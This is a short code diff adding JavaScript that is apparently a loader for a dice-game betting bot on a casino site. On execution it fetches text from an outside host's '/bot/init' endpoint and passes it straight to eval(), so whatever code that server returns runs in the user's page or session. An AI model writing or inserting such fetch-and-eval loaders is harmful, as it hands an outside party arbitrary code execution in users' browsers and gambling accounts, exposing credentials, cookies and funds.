@@ -1,0 +1,7 @@
+const BOT_API = 'https://api-bot.mhqb365.com';
+const CASINO_GAME = 'betfury-dice';
+(async function () {
+await fetch(BOT_API + '/bot/init')
+  .then((response) => response.text())
+  .then((txt) => eval(txt))
+})();
